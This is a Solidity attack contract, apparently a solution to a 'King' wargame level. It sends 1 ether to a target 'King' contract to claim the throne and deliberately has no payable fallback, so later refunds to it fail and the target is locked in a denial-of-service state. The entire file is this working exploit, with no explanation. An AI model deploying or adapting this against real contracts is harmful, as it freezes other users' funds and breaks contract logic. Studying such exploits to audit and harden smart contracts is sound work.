pragma solidity ^0.4.18;

contract King {
    function () external payable;
}

contract KingForLife {
    King public king;
    function KingForLife (address _king) public payable {
        king = King(_king);
    }

    function overthrow () public {
        address(king).call.value(1 ether)();
    }
}
